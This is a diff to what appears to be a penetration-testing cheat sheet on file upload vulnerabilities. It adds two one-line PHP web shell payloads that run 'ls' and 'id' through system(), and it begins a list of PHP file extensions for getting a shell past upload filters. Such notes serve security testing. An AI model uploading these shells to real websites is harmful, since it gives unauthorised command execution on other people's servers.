@@ -1,4 +1,7 @@
 You should always test for file upload vulnerabilities by trying to upload simple php shells in target websites.
+
+<?php system('ls') ?>
+<?php system('id') ?>
 ## Via Common php file extensions:
 1. .php
 2. .php3
